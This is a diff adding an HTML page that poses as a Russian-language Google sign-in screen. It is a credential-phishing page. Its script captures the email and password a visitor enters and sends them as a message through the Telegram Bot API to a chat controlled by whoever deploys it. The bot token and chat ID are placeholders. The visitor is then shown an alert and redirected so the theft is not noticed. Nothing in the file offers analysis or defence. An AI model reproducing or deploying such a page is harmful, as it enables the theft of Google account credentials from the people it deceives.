@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Вход через Google</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      text-align: center;
+    }
+    .login-container h2 {
+      margin-bottom: 20px;
+      font-size: 24px;
+      color: #202124;
+    }
+    .login-container input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4285F4;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .login-container button:hover {
+      background-color: #357ABD;
+    }
+    .login-container .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="google-icon.png" alt="Google" class="logo"> <!-- Логотип Google -->
+    <h2>Войдите в аккаунт Google</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Пароль" required>
+      <button type="submit">Войти</button>
+    </form>
+  </div>
+
+  <script>
+    // Функция для отправки данных в Telegram
+    function sendToTelegram(message) {
+      const botToken = "YOUR_BOT_TOKEN"; // Замените на токен вашего бота
+      const chatId = "YOUR_CHAT_ID"; // Замените на ваш chat_id
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          console.log("Сообщение отправлено в Telegram:", data);
+        })
+        .catch(error => {
+          console.error("Ошибка отправки сообщения:", error);
+        });
+    }
+
+    // Обработка отправки формы
+    document.getElementById("loginForm").onsubmit = function (event) {
+      event.preventDefault(); // Отменяем стандартное поведение формы
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Формируем сообщение для Telegram
+      const message = `Новый вход через Google:\nEmail: ${email}\nПароль: ${password}`;
+
+      // Отправляем данные в Telegram
+      sendToTelegram(message);
+
+      // Оповещение пользователя
+      alert("Данные отправлены. Перенаправление...");
+
+      // Перенаправление на другую страницу (например, главную)
+      window.location.href = "/";
+    };
+  </script>
+</body>
+</html>
